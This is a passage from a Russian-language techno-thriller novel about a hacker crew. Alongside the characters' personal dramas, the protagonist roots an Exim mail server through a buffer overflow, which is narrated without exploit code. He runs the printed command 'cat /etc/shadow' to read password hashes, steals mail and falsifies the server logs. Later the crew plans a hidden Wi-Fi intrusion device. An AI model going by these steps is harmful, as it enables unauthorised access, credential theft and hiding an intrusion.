 — Как будто у тебя своих не было, — усмехнулся Кирилл, слушавший изли‐
яния друга уже битый час.
 — Если что и было, то ничего не нашли, — взглянул на него исподлобья
Саня, — а больше мне предъявить нечего.
  Фреш свою часть уговора выполнил, и Кириллу пришлось выполнять
свою — утром он в сопровождении Леонида заглянул в канцелярию, под‐
писал договор и заодно — грозную бумагу под названием «Соглашение
о неразглашении  конфиденциальной информации»,  после чего получил
наконец карточку постоянного пропуска. В отличие от Санчо его свободу
передвижения тут никто не ограничивал, потому он немного прогулялся
по центру города, любуясь местной архитектурой, постоял на набережной
и прокатился в метро. С Трикси толком поговорить не удалось: складывалось
ощущение, будто девушка по какой‑то непонятной причине старательно
избегает встречи, и это доставляло Кириллу боль — он не мог понять, что
с ней происходит и чем вызвано такое поведение. Неизвестность давила
невидимым грузом и действовала на нервы. Зато Санчо, истосковавшийся
по дружескому общению, не отставал от него с самого обеда, в красках
повествуя свою печальную историю.





— Я, Сань, никак не могу понять, с чего тебя вообще понесло во все тяж‐
кие, — озвучил давно мучавший его вопрос Кирилл. — Уж что‑что, а башка
у тебя всегда на месте была.
 — Ни хрена ты не знаешь, — горько усмехнулся Санчо, — это всё следс‐
твия, а вот причина… Я в детстве только и слышал от предков: «это нельзя»,
«то нельзя», «учись лучше, бестолочь», «зубри, а то нищебродом вырастешь»,
«мозгов нету, бери усердием», «нам за тебя стыдно», ну и всякое такое про‐
чее. У меня, можно сказать, вся жизнь прошла между желанием само‐
утвердиться, комплексами и заниженной самооценкой. Потом начались деп‐
рессии, правда, я тогда не понимал толком, что со мной происходит, да и
слова‑то такого не знал, просто чувствовал, что мне хреново. А когда бабло
появилось,  только  всякие  разные  стимуляторы и  позволили  выдохнуть
да взглянуть на жизнь другими глазами.
 — И куда они тебя привели?
 — Сам знаю, куда, — огрызнулся Санчо, — ты мне тут еще начни мораль
читать, проповедник, блин, нашелся… Разгребусь с проблемами, пойду
к мозгоправам, зуб даю. Понимаю я все, Кикс, не дурак.
   «Хорошо, если понимает», — подумал Кирилл. Еще лучше, если сможет
удержаться и действительно отыщет в себе силы что‑то изменить.





Помимо Кирилла, Сани и Аллы, в комнате, куда определил их на работу
Фреш, трудилось еще трое: долговязый Шпала, тощий и немного лопоухий
Грек, а еще — похожий на головастика, замкнутый и неразговорчивый Финч.
Настоящим именем представился только Грек, назвавшись Гришей, осталь‐
ные ограничились прозвищами. Кто они и откуда, Кирилл не знал. В столовке,
где, к слову, кормили как на убой, он видел и других ребят, но все они жевали
молча и за обеденное время не перебросились друг с другом ни словечком.
 — Ну что, бойцы невидимого фронта, — поприветствовал их с добродуш‐
ной улыбкой Леонид, — задачка сегодня у нас простая, но интересная. Есть
почтовый сервачок, содержимое которого очень хотелось бы изучить пов‐
нимательнее. Исходные данные я сейчас сброшу в общий чатик, развлекай‐
тесь. Постарайтесь только действовать аккуратнее, лишнее внимание нам
ни к чему.
   Кирилл обвел  взглядом  комнату:  Аллу,  отгородившуюся  монитором
в самом дальнем углу, он не видел, Саня нервно барабанил пальцами по сто‐
лу — он явно чувствовал себя здесь неуютно. Шпала изучал что‑то на экране
со скучающим видом, а остальные сосредоточенно долбили по клавишам.
   Прочитав сообщение Фреша в общем джаббер‑чате, Кирилл решил
для начала пощупать удаленный хост и хотя бы понять, с чем им придется
иметь дело. На его машине имелся целый хакерский арсенал, от богатства
которого буквально разбегались глаза. Помимо кучи сканеров, тут обнаружи‐
лись снифферы, брутилки паролей, отладчики, упаковщики, виртуалка с нес‐
колькими предустановленными системами, готовая подборка  эксплоитов
и инструменты для создания связок малвари с обычным софтом. На локаль‐
ном сервере хранилась большая база троянов и файловых вирусов, как в
виде готовых сборок под разные  архитектуры, так и в  исходниках, —
при необходимости можно было скачать себе на машину любой из них. Фреш
говорил, что в соседней комнате сидят реверс‑инженеры, у них на компах
стояли всякие дебаггеры, сандбоксы, трассировщики и дизассемблер IDA.
В общем, техника была подготовлена что надо, и, посмотрев на это велико‐
лепие, Киря подумал, что заботливо собранный на его ноуте софт выглядит
жалкими детскими игрушками по сравнению с этой пещерой Аладдина.
   Половиной инструментов он и пользоваться‑то толком не умел, о некото‐
рых и вовсе услышал впервые, но твердо решил освоить всё, что только удас‐
тся. Благо в локалке нашелся отдельный сервер с документацией, а в коридо‐
ре громоздился огромный книжный шкаф с прозрачными дверцами, доверху
забитый книжками. На обложках красовалось всевозможное зверье, а еще —
люди в замысловатых средневековых одеждах. Записывай заинтересовав‐
шую тебя книжку в специальную тетрадочку, бери да просвещайся. А ведь
есть и еще один шкаф. Там ровными рядами стоят пронумерованные плас‐
тиковые кейсы с компакт‑дисками. Операционки разных версий, куча анти‐
вирусов на любой вкус, разнообразный софт от офисных пакетов до ком‐
пиляторов — ассортименту позавидует любой «развал» на радиорынке. Хотя
там, наверное, и половины этих программ нет…
  Тем временем работа шла своим чередом. «По ходу, там Exim», —
написал в чатик Санчо. Ага, то же самое подтвердили и Шпала с Греком, да и
сам  Кирилл  пришел  к  аналогичному  выводу. С  «Экзимом»,  агентом
для пересылки почты, который изобрели еще в девяностых в Кембриджском
университете, он раньше не сталкивался, хотя и читал о нем. Хорошая прог‐
рамма, легкая, быстрая, но при этом хрупкая, как стеклянная ваза. Вот бук‐
вально же недавно что‑то про нее читал, вспомнить бы, что именно и где…
  Финч отписался, что на серваке, скорее всего, крутится Debian, а Шпала
уточнил версию самой почтовой службы — 4.6. Кирилл застучал по кла‐
вишам — и поначалу не обратил внимания на сообщение, появившееся
в джаббер‑клиенте. Сообщение от Трикси, причем отправленное ему лично,
а не в общий чат. Текст был коротким: «буфер».
   Пару секунд Киря недоуменно хлопал глазами, вчитываясь в непонятное
послание, а потом мысленно хлопнул себя ладонью по лбу. Ну конечно же!
В памяти всплыла заметка о недавно обнаруженной уязвимости, позволяв‐
шей выполнять на серверах с Exim произвольный код. Мысли понеслись
галопом: если немного поколдовать с протоколом и запихнуть в одну из сек‐
ций с данными достаточно большой блок информации, то можно получить
на удаленном хосте шелл, а уже с его помощью…
   Дальнейшее Кирилл обдумывал уже на ходу: посмотрев в сканере список
открытых TCP-портов, он запустил терминал, а рядом открыл еще одно окош‐
ко, в котором начал вбивать код, извлекая его из глубин своей памяти.
   Тихий клик  Enter. Программа скомпилировалась за считаные минуты,
не выкинув ни единой ошибки. Кирилл почувствовал прилив адреналина —
знакомое ощущение  охотника,  почуявшего  приближение  дичи.  Пальцы
бегали по клавиатуре, отправляя в терминал команду за командой. Черное
окно ожило, по экрану побежали строки вывода. А вот и ответ на запрос к уяз‐
вимому процессу Exim — в одной из серверных папок появился неприметный
файлик с расширением .sh. Осталось только его запустить…
   Кирилл не торопился. Слишком резкие действия могли выдать его при‐
сутствие в системе. Он, словно хирург, осторожно делающий надрез на теле
спящего пациента, шаг за шагом пробирался вглубь чужой машины, стараясь
оставаться незамеченным. Вот она, настоящая магия, способность управлять
чем‑то мощным и невидимым практически одной только силой мысли. Корот‐
кая команда — и на экране снова промелькнули строки, а потом появился
символ решетки. Он потянулся к клавиатуре.



  # whoami


Ответ вернулся немедленно. Root. Его губы изогнулись в легкой усмешке.
   Теперь сервер принадлежал ему. Это было странное чувство, которое
Кирилл испытывал уже не раз, — словно он стоял посреди чужого дома, хозя‐
ева которого уехали в далекое путешествие и даже не подозревают о нез‐
ваном визитере. В такие минуты Кире казалось, что для него не существует
ни стен, ни замков, ни преград, и это ощущение могущества приятно щекота‐
ло нервы.
  На всякий случай он проверил сетевую конфигурацию. Сервер оказался
связанным с несколькими другими системами. Каждая из них могла стать
новой целью, но сейчас он пришел сюда не за этим. Логи, конфигурации,
адреса — Кирилл словно очутился в чужой сокровищнице. Здесь могло скры‐
ваться что угодно: от безобидных сообщений до опасных секретов. Он быс‐
тро вывел список пользователей и сохранил их в файл, чтобы не задер‐
живаться ни на минуту: время не на его стороне.



  cat /etc/shadow


Пароли, закодированные в хеши, стекались к нему на экран, как ручейки
талой воды в бурную реку. Но сейчас его интересовало другое: в одной
из папок должна храниться более важная цель — зашифрованная переписка,
заветный приз в этой увлекательной игре. Набрав команду ls, Кирилл вывел
на экран список расположенных там файлов.
   Сотни сообщений.  Вроде бы ничем не  примечательная  переписка,
но Кирилл знал: за безликими именами файлов скрывалась информация,
которая могла стоить целое состояние, ведь не зря кому‑то понадобилось
содержимое этого сервера.
  Он запустил скрипт, который поможет ему вытащить нужные данные. Код,
что Кирилл когда‑то написал сам, жадно проглотил содержимое папки, пре‐
образуя скачиваемые из сети байты в понятный формат. Кирилл внимательно
следил за процессом, не отрывая взгляда от строк, мелькающих на экране.
 — Неплохо, — раздался за спиной тихий голос Леонида, — выгружай все,
что сможешь, в файлообменник, и выходи. С командной работой у вас пока
еще не очень, но это мы исправим со временем.
   Кирилл кивнул. Файлы, словно вода из пробитого резервуара, потекли
в сетевое хранилище. Леонид обошел его стол и прислонился к стене, скрес‐
тив руки.
 — Трикси, закинь им в логи несколько строк, эмулирующих работу сканера
безопасности, — попросил он.
 — Я сам сделаю, — сказал Кирилл, открывая папку /var/log/exim/
mainlog.
   «Уходя, гасите свет» — так было написано на каком‑то древнем советском
плакате. Мысль разумная: Киря записал в журнал почтовика фальшивую
активность вместо своих реальных действий, притворившись системным ска‐
нером. Теперь все было чисто. Можно выходить из системы.
   Леонид хлопнул его по плечу:
 — Вот теперь молодец. Я всегда говорил, что у тебя огромный потенциал.
 — Экзамен сдал? — Кирилл устало откинулся на спинку стула, чувствуя
удовлетворение от проделанной работы.
   Тот лишь пожал плечами.
 — Это был не экзамен, Кикс, а скорее вступительный тест. Основное
веселье начнется позже.





В общем коридоре сейчас не было ни души. Кирилл достал из кармана
мобильник и набрал знакомый номер.
 — Привет, мам, — произнес в трубку он, услышав в трубке родной голос.
 — Привет, сынок. Где ты, как дела?
 — Все нормально, мам, я сейчас в Питере, устроился на работу.
 — А что за работа? Где ты там живешь? Ты не голодный, Кирюша?
  От этого потока вопросов Киря слегка поморщился: вроде уже взрослый
человек, а мать все никак не может избавиться от синдрома наседки, бук‐
вально придавливая его своей гипертрофированной заботой.
 — Работа интересная, — ответил он, — с компьютерами связанная. Я
тебе потом подробно все расскажу. Платят нормально, даже кормят бесплат‐
но. Комнату вот предоставили, так что не беспокойся, все хорошо. Сама‑то
ты как?
 — Да ничего, — в голосе матери послышались усталые нотки, — на работу
хожу, все как обычно. Чувствую только себя не очень, живот побаливает. Я
таблеток купила, принимаю, вот вроде получше стало…
 — Ты к врачу обращалась? — встревоженно перебил ее Кирилл.
 — Да не пойду я к врачу, — отмахнулась мать, — это все от нервов, прой‐
дет.
 — Давно болит?
 — Пару недель, наверное, может, чуть больше, — неохотно призналась
она.
 — Мам, ты же в больнице работаешь. Неужели не к кому обратиться?
 — Так у нас же детская! — словно непонятливому младенцу, принялась
объяснять мать. — К кому я тут пойду, сам подумай?
 — Ма, давай договоримся, что ты завтра же запишешься в поликлинику, —
настойчиво произнес Кирилл. — И не вздумай отказываться.
   Поболтав еще с минуту и нажав отбой, Киря немного поразмыслил и наб‐
рал еще один номер.
 — Тетя Таня? — спросил он, когда соседка взяла трубку. — Здравствуйте,
как ваши дела?
   Переждав обязательное в таких случаях сюсюканье и град всевозможных
вопросов, Кирилл перешел к делу, ради которого и решил побеспокоить
пожилую женщину:
 — Теть Тань, мама мне тут на здоровье пожаловалась, а я сейчас далеко,
не смогу приехать. Вы уговорите ее, пожалуйста, к докторам сходить. А лучше
не просто уговорите, а отведите в ближайшую платную клинику, пусть ей там
обследование сделают. Я вам сейчас денег переведу, чтобы оплатить все,
что там скажут. Анализы, УЗИ, пускай сделает все необходимое, ладно? Толь‐
ко вы уж ее заставьте, сама она не пойдет…
   Убедив соседку в серьезности своих намерений и попросив сразу же зво‐
нить, если что, Кирилл с облегчением выдохнул. И тут его уединение ока‐
залось нарушено самым непредвиденным образом.
 — Алла! — ухватил он за плечо девушку, которая как раз попыталась прос‐
кользнуть мимо.
   Трикси остановилась. Она не попыталась освободить руку, но смотрела
при этом куда‑то в сторону, словно боялась встретиться с ним взглядом.
 — Объясни мне, пожалуйста, что происходит?
 — Ничего, — отстраненно ответила она.
 — Ничего? — переспросил Кирилл,  нахмурившись. Его пальцы все
еще крепко сжимали ее плечо, но не грубо, а скорее настойчиво. — Алла, я
не дурак. Ты ходишь кругами, как будто специально прячешься от меня. А я
не понимаю, в чем дело и чем я перед тобой провинился. Может, наконец
расскажешь?
   Трикси наконец посмотрела на него.
 — Отпусти меня, Кикс, — произнесла она ровным голосом, но с оттенком
напряжения.
   Кирилл сжал зубы и убрал руку, но не отошел. Алла снова отвела взгляд,
сосредоточив его на картине в пластиковой рамке, что висела за его спиной.
 — У меня задержка, Кирилл, — сказала она ровным голосом, но было вид‐
но, что эти слова дались ей с огромным трудом.
 — Ты хочешь сказать…
 — Я ничего не хочу, — оборвала его Трикси, — и тем более я ничего
не хочу сейчас от тебя. Дай мне время.
   Кирилл замер, словно она ударила его по лицу. На несколько мгновений
между ними воцарилась тишина, напряженная, как натянутая струна. Кирилл
стиснул зубы, пытаясь понять, как поступить и что сказать ей в ответ. Мысли
путались, и ничего дельного просто не приходило в голову.
 — Ладно, если ты так хочешь, — сказал он наконец, — я не буду давить.
Но ты ведь понимаешь, что это касается не только тебя…
   Алла подняла на него взгляд, и на этот раз в ее глазах появилось что‑то
похожее на боль.
 — Поверь мне, Кикс, я стараюсь сделать так, как будет лучше для нас обо‐
их.
  Она развернулась и ушла, оставив Кирилла наедине с его мыслями. Он
проследил за ней взглядом — и ему показалось, что там, в конце коридора,
Аллу ждала хорошо знакомая ему фигура.
GEEK





   Сила действия всегда равна силе противодействия — так Кирилла учили
в школе на уроках физики. В мире чистой информации третий закон Ньютона
обрел иную форму, не изменив своей сути: любая атака неизбежно сталкива‐
ется с защитой, и ее мощь всегда соизмерима с возможностями напада‐
ющих. Системные администраторы и безопасники учатся быстро, они с удо‐
вольствием перенимают опыт своих коллег, и для каждой уязвимости рано
или поздно отыскивается заплатка, а бывает, вокруг нее вырастает целый
неприступный бастион, преодолеть который становится практически невоз‐
можно. Приходится искать иные пути, а значит, учиться, учиться и еще раз
учиться, как завещал один известный политик из прошлого. Учиться и на сво‐
их, и на чужих ошибках, осваивать новые инструменты и экспериментировать
с теми, которые уже успел попробовать в деле.
   Трикси по‑прежнему старательно избегала его, и перемешанную с обидой
тревогу приходилось топить в работе. Теперь Кирилл проводил за компом
почти все свободное время — читал документацию и, подняв виртуалку, гонял
на ней хакерские тулзы из лежащего на винте арсенала. Был в этом занятии
и личный интерес. Он практически полностью изучил скачанный когда‑то
с бесследно исчезнувшего сервера архив, остался только последний арте‐
факт, с которым он не успел толком разобраться. В одной из веток форума
некто под ником DImonoID писал, что сумел раздобыть инфу по какому‑то
проекту «Перцептрон», и просил у товарищей помощи в расшифровке файла.
Сам файлик был прикреплен тут же, но помочь «Димоноиду» никто так и не
сумел. Ради интереса Кирилл открыл файл в Hex-редакторе, но увидел лишь
бесформенную кашу из равномерно перемешанных  байтов: ни внятных
заголовков, ни секций, ничего, за что можно было бы зацепиться. Это только
раззадорило его  любопытство. Теперь он  надеялся  расковырять файл
с помощью появившихся у него инструментов, но пока не представлял,
с какой стороны подступиться к этой задаче.
 — Работаешь? — раздался за спиной знакомый голос.
   Леонид не изменил своей привычке беззвучно подкрадываться сзади,
и Кирилл невольно вздрогнул от неожиданности при его появлении. Фреш
был одет нарочито небрежно, впрочем, как обычно: расстегнутый пиджак,
под которым виднелась мятая футболка, а в руке он сжимал кружку кофе
из автомата, источавшую густой горьковатый аромат.
 — Типа того, — буркнул в ответ Кирилл.
 — Кажется, это называется «пытаюсь вспомнить, что такое таблица
ACL», — с иронией произнес Леонид, покосившись на экран. — Пять утра,
Кикс, и к тому же сегодня суббота, можно дрыхнуть до обеда.
 — Сам‑то чего не спишь? — огрызнулся Киря.
 — На том свете отоспимся, — ухмыльнулся Леонид. — Привык рано вста‐
вать, вот и сегодня решил не отступать от распорядка.
 — Ты зачем пришел? Если за бесплатным кофе — он возле столовки, пря‐
мо по коридору и налево.
 — Мимо шел, увидел, в офисе свет горит. Решил посмотреть, что тут тво‐
рится, — Леонид отпил из своей кружки. — Тебе, кстати, не скучно у нас?
Без адреналина, без приключений?
   Кирилл минуту помедлил с ответом.
 — Не скучно, — наконец сказал он. — Здесь просто... другое. Да и своими
делами  в  свободное  время  заниматься  можно…  Ты,  кстати,  слышал
что‑нибудь о проекте «Перцептрон»?
 — Как ты сказал? — Фреш вдруг заметно напрягся.
 — «Перцептрон». Слово мудреное, с первого раза не запомнить, все
«пенициллин» на языке вертится. Я случайно нашел файлик, который вроде
как имеет к этому какое‑то отношение, но он зашифрован. Вот, смотри…
 — Где ты это взял? — настороженно поинтересовался Леонид, вглядыва‐
ясь в монитор, на котором Киря развернул свою находку.
 — Где взял, там больше нет, — честно ответил он.
 — Погоди, Финча разбужу. Он у нас спец по криптографии.
 — Так пять утра же, — бросил в спину удаляющемуся Фрешу Кирилл,
но тот его уже не слышал.
   Заспанный Финч, с трудом продирая слипающиеся  глаза, прокрутил
содержимое файла в окошке редактора и скомандовал:
 — Скинь на мою машину.
   Леонид сбегал за кофе и поставил перед Финчем дымящуюся кружку, пока
тот  орудовал за  клавиатурой  просыпающегося  компьютера. С  полчаса
парень пыхтел, переключаясь между несколькими окнами, после чего выдал
свой вердикт:
 — Файло было накрыто упаковщиком, под ним какой‑то зашифрованный
документ. На SHA-256 не похоже, тут блоки по 64 бита, сейчас попробую пок‐
рутить его так‑сяк.
  В течение следующих нескольких часов Финч увлеченно стучал по клаве
и сосредоточенно сопел, окончательно утратив связь с реальностью. Леонид
как заведенный бегал к кофемашине и обратно, притащив в офис полную
тарелку печенья: по всему было видно, что он заинтересован в результате
не меньше Кирилла. Несмотря на выходной, в комнату понемногу стали под‐
тягиваться и другие участники команды — пришли Грек со Шпалой, затем
появилась Алла, встала рядом с Фрешем и что‑то тихо ему сказала. Тот кив‐
нул, ответил вполголоса, коснувшись ее плеча. Глядя на это, Кирилл ощутил
болезненный укол ревности, но промолчал, бессильно стиснув зубы.





— По ходу, расковырял, — подал наконец голос Финч, и все присутствующие
склонились над его монитором, с интересом разглядывая содержимое рас‐
шифрованного файла.
   Перед ними была карта сети. Имена хостов, IP-адреса, конфигурации
шлюзов, серверов и маршрутизаторов с обозначением подсетей, таблицы
с именами пользователей…
 — Кикс, ты даже не подозреваешь, какое сокровище раздобыл! — радос‐
тно воскликнул Леонид.
 — Так, может, ты мне объяснишь?
   Леонид задумался, словно взвешивая все за и против, а затем решился:
 — «Перцептрон» — один из проектов TerraCore, сервера которой вы
со Sсade когда‑то ломали. Знаю, что в слитых оттуда данных искали в первую
очередь это. Еще знаю, что не нашли.
  Финч с Греком переглянулись: они были не в курсе, что Кирилл когда‑то
был участником этой нашумевшей, но уже полностью разгромленной хакер‐
ской группировки.
 — А ты случайно не знаешь, кто был заказчиком того взлома? — осторож‐
но спросил Киря, уже догадываясь, каким будет ответ.
 — Знаю, — загадочно улыбнулся Леонид.
  Он хотел добавить что‑то еще, но его перебил сгорающий от любопытства
Грек:
 — И в чем суть проекта?
 — Ты что‑нибудь слышал о нейронных сетях? — повернулся к нему Фреш.
   Кирилл и Грек непонимающе переглянулись: термин был для них новым
и совершенно незнакомым.
 — Что‑то из области медицины?
 — Не совсем, — поморщился Леонид, — что‑то из области искусствен‐
ного интеллекта.
   Кирилл недовольно скривился: «искусственный интеллект» в его понима‐
нии относился к той же категории явлений, что ясновидение, экстрасен‐
сорика и летающие тарелки. То есть к фантастике в ярких аляповатых
обложках, на которых накачанные мускулистые самцы сражаются с обезумев‐
шими роботами.
 — Зря физиономию воротишь, — заметил его скепсис Леонид, —
на самом деле там чистая математика, очень сложная, правда.
 — Больше похоже на какую‑то антинаучную лажу, — озвучил Кирины мыс‐
ли Шпала.
 — Ага, только если не хочешь через пару лет оказаться за бортом, придет‐
ся эту лажу как минимум учитывать, — возразил ему Фреш. — На самом деле
там всего лишь набор программ, которые учатся решать задачи примерно
так, как это делает наш мозг: они анализируют много примеров и находят
закономерности. Данные проходят через слои  искусственных нейронов,
которые выполняют простые вычисления. Каждое соединение — это фор‐
мула, каждый нейрон — математическая функция. На выходе получается
решение. Вообще, сам принцип придумали еще в сорок третьем году, а пер‐
вый прототип создали в пятьдесят седьмом. Так что нет здесь ничего прин‐
ципиально нового.
 — И где это можно использовать? — деловито поинтересовался Шпала,
привыкший смотреть на вещи исключительно с практической стороны.
 — Ну, например, распознавание образов. Умные спам‑фильтры можно
на такой штуке построить. Разные вещи автоматизировать. Да хоть защиту
от сетевых атак организовать. Или, наоборот, сами атаки.
 — Это как? — не понял Кирилл.
 — А вот так, Кикс. Такие штуки уже сейчас могут генерировать сложные
ключи, анализировать шифры. Вот этот файлик нейронка расколола бы в два
раза быстрее, чем с ним управился Финч. Если нейросеть натренировать, она
может искать уязвимости лучше, чем ты. Так что у тебя есть все шансы
однажды остаться без работы. Скажите мне лучше, ребята, сможем мы в эту
сетку влезть и немного там побезобразничать?
   Пять пар глаз уставились на схему сети, все еще болтавшуюся на экране.
 — Без шансов, — вынесла свой вердикт Алла. — То, что торчит наружу,
просто так не сломаешь, а чтобы пробиться через Wi-Fi, нужно оказаться
непосредственно на объекте или совсем рядом с ним.
 — Лео, а где вообще это все находится? — задумчиво поинтересовался
Кирилл. — Ну, территориально?
 — Атланта, Джорджия. Там один из крупных филиалов TerraCore. А что?
   Проигнорировав обращенный к нему вопрос, Киря уселся за свой комп
и запустил гугловские карты. Удивительная штука, позволяющая рассмотреть
даже спутниковые антенны на крышах отдельных домов. Скажи Кириллу
кто‑нибудь пару лет назад, что такое возможно, — ни за что бы не поверил.
   Быстро отыскав нужный адрес, он начал медленно прокручивать спут‐
никовые снимки, изучая окрестности здания, где разместились офисы ком‐
пании. Район оказался совсем не центральным, и вокруг корпусов TerraCore
виднелась россыпь частных домов и небольших коттеджей, прилепившихся
к ниткам дорог, как ягоды к грозди винограда.
 — Если взять включенный карманный компьютер с правильным софтом
и присобачить к нему мобильник в качестве модема, а потом отправить курь‐
ером вот в этот или в этот дом, туда вполне может добить сигнал офисной
сети, — высказал наконец свою идею Кирилл. — Эх, хорошо бы использовать
для этих целей не наладонник, а какой‑нибудь миниатюрный комп с аккумуля‐
тором, нормальной операционкой и беспроводным интерфейсом прямо
на борту. Жаль, нигде таких не делают…
 — А мы сейчас у Шпалы спросим, — оживился Леонид, — он у нас как раз
большой специалист по телефонам и Windows CE.
 — Так можно коммуникатор взять, — пожевав губами, предложил Шпа‐
ла, — там, в принципе, все нужное есть. А софт мы сами напишем. С ним
потом соединимся по терминалу, только канал очень медленный и нес‐
табильный получится. Ну и симка местная понадобится…
 — Главное, в сети закрепиться, потом придумаем, как шлюз наружу про‐
бить, — азартно потирая руки, сказал Грек: он уже предвкушал предстоящий
взлом. — Только вот как этот девайс на место доставить?
 — А у нас для этого настоящий кардер есть, — Кирилл оглянулся и отметил
про себя, что Санчо как раз таки в комнате отсутствует. — Он на доставке
всяких разных посылок и на дропах не одну собаку съел. Пойду узнаю, что он
по этому поводу думает.
   Санчо отыскался именно там, где Кирилл и ожидал его найти, — он лежал
на кровати, с безразличием разглядывая потолок. Киря, предложивший другу
переехать к нему в комнату, замечал, что у того периоды полной апатии пери‐
одически сменяются тревожностью. В такие моменты Саня замыкался, нас‐
тороженно поглядывая на торчащие в коридоре и в рабочих помещениях
видеокамеры, а однажды вечером перевернул их жилище вверх дном в поис‐
ках спрятанных микрофонов. Ни одного, правда, так и не нашел. Видимо,
вынужденный отказ от привычных стимуляторов действовал на него не луч‐
шим образом. Впрочем, Леонид выдал Сане каких‑то успокоительных таб‐
леток, которые тот жрал горстями. И не сказать, чтобы они ему сильно
помогали, по крайней мере, спал Санчо беспокойно, часто вскакивал среди
ночи и начинал бродить по комнате, заставляя Кирю просыпаться и понем‐
ногу жалеть о своем щедром предложении.
  Фреш и сам когда‑то был дроповодом и часто имел дело с подобными
вещами, но Кирилл решил воспользоваться случаем и озадачить вконец рас‐
кисшего друга хоть каким‑нибудь настоящим делом. Пусть почувствует себя
нужным, а то скоро окончательно с катушек слетит.
 — Сань, сможем мы отправить наладонник на нужный адрес в Штатах,
но  так,  чтобы  его  предварительно  включили и  заныкали  куда‑нибудь
в укромное место, где его не найдут? А если найдут, то не сразу?
 — Как два байта переслать, — пожал плечами Санчо.
 — Поможешь? У тебя выходы на местных дроповодов наверняка есть.
 — Найдем, — так же безразлично откликнулся он.
 — Ты чего опять киснешь? — решил хоть немного растормошить друга
Кирилл. — Что, снова настроения нет?
 — А сам? Вчера вечером приперся откуда‑то и сидел тут с недовольной
рожей, как будто дерьма наелся.
   Что ж, справедливое замечание. С душевным равновесием и у него
самого в последнее время было как‑то не очень.
 — Хотел с Аллой поговорить по душам, не получилось, — вздохнув, приз‐
нался Кирилл. — Кажется, она с Фрешем сейчас больше общается, чем
со мной.
 — Кажется? — приподнялся на локте Санчо. — Вообще‑то она с ним
встречалась до того, как с тобой мутить начала.
 — Ты откуда это взял? — слегка опешил Кирилл.
 — Сама мне рассказала. Кирюх, ты как с дуба рухнул. Фреш нас с ней
и познакомил, помнишь? Они встречались какое‑то  время, потом  раз‐
ругались чего‑то, но вроде друзьями решили остаться… Так она мне говори‐
ла.
   Вот оно что. Эта новая информация будто сдернула пелену с глаз, зас‐
тавив Кирилла взглянуть на происходящее совершенно иначе.

                       ***

Кадлер любил итальянскую кухню, и этот небольшой уютный ресторанчик
на тихой Бергард‑стрит он облюбовал еще несколько лет назад. Десять
минут езды от офиса, полчаса до дома. Здесь подавали изумительное кар‐
паччо, ради которого Джейк готов был терпеть даже неприлично высокие
по местным меркам цены. Зато посетителей в заведении обычно было нем‐
ного, что позволяло при необходимости пообщаться в приватной обстановке,
не опасаясь посторонних ушей. Поэтому Кадлер и назначил встречу именно
здесь.
   Человек по имени Лиам появился вовремя, не опоздав ни на минуту:
зашел в зал, огляделся, перебросился парой слов с дежурившим у входа
официантом и уверенно направился к его столику. Кадлер с интересом раз‐
глядывал прославленного «охотника на хакеров»: Лиам оказался невысоким
молодым мужчиной лет тридцати пяти с внимательными серыми глазами. Он
был не слишком тщательно выбрит, но темная густая шевелюра, аккуратно
зачесанная на пробор, говорила о том, что этот парень следит за своей
внешностью. Бесформенная толстовка с логотипом «Нью‑Йорк Янкис» скра‐
дывала особенности фигуры, которая из‑за невеликого  роста казалась
по‑подростковому щуплой. Удивительное дело: Лиам слыл учеником самого
Симомуры, и Кадлер думал, что тот окажется немного постарше. Словом, он
представлял себе этого человека несколько иначе.
 — Мистер Кадлер? — усаживаясь напротив, поприветствовал его Лиам.
 — Просто Джейк. Хорошо добрались?
 — Благодарю, без приключений, — Лиам положил свой рюкзак на пол,
быстро огляделся и, убедившись, что вокруг никого постороннего нет, слегка
расслабился. — Надеюсь, вы не ждали слишком долго?





— Нет, я всегда прихожу заранее, — ответил Кадлер, пододвигая папку
с меню поближе к краю стола. — Привычка, знаете ли.
 — Полезная привычка, — заметил Лиам с легкой улыбкой. Он устроился
поудобнее и взглянул на собеседника чуть пристальнее, словно пытался
на ходу составить о нем мнение. — Итак, вы хотели обсудить что‑то... нес‐
тандартное, как я понимаю?
   Кадлер медленно кивнул.
 — Мне нужна информация об одном человеке. Вся, которую вы сможете
раздобыть. Где он сейчас находится, чем занимается, о чем думает, сколько
раз в день посещает уборную… Но, скажем так, особенности дела требуют
строгой конфиденциальности.
   Лиам слегка приподнял бровь, но лицо его оставалось непроницаемым.
 — Понимаю, раньше я уже работал с ФБР. А вы уверены, что это дело
для охотника на хакеров, а не, скажем, для юристов или полиции?
 — Уверен, — твердо ответил Кадлер. — Мы пытались разыскать этого
человека, выяснили кое‑какие детали о его личности, но сейчас он вне нашей
досягаемости. Тем не менее он мне нужен.
 — Кто‑то еще занимается этим делом? — осторожно уточнил Лиам.
 — Пока только мы. Но, полагаю, это ненадолго. АНБ вовсю проявляет
к этому интерес.
 — Значит, времени мало, — тихо произнес Лиам, обращаясь скорее
к самому себе, чем к собеседнику. — Что за человек?
 — Русский хакер. Раньше действовал в составе группы Sсade, пока мы
не переловили большинство его товарищей. Известен под ником Кикс, нас‐
тоящее имя — Кирэйл, если я правильно это произношу, у русских совер‐
шенно невозможный язык.
   Лиам откинулся на спинку стула, скрестив руки на груди, нервно побара‐
банил пальцами, а затем поднял внимательный взгляд на Кадлера.
 — Ладно, Джейк, рассказывайте всё, что знаете. Только, пожалуйста,
с самого начала.
GEEK





   Когда видишь перед собой цель, жизнь становится понятнее и определен‐
нее. Работа в группе кипела теперь с утра и до позднего вечера, а порой про‐
должалась и за полночь: здесь не было жесткого графика, поэтому каждый
выбирал для себя тот распорядок дня, который казался ему удобнее. Шпала,
например, усаживался за комп ранним утром, а вылезал из‑за клавиатуры
затемно. Финч подтягивался ближе к обеду, Грек и вовсе приходил во второй
половине дня, а то и вечером и потом трудился почти всю ночь напролет. Аллу
в последние дни Кирилл видел редко, она появлялась в комнате всего пару
раз, и однажды он застал ее в столовой, мило болтающей о чем‑то с Фре‐
шем. Он хотел еще раз поговорить с ней по душам, но ничего не вышло —
Трикси улизнула прежде, чем ему удалось сказать ей хотя бы несколько слов.
  Он и сам не до конца понимал, как теперь быть и что делать. Настолько
серьезные и глубокие отношения сложились у него впервые, потому, пытаясь
разобраться в происходящем, он запутывался все больше, как неосторожная
рыба в сетях. Почему она сказала, что не видит с ним будущего? Почему
не сообщила прямо, что все кончено? А может, она ждет, что он сделает пер‐
вый шаг? Еще сложнее было понять, чего хочет он сам. Вернуть ее? Убедить,
что все будет хорошо, что они справятся? Мысли о ней преследовали его
постоянно, память услужливо показывала образы, которые он изо всех сил
старался запихнуть куда‑то на задворки сознания. Как она теребила волосы
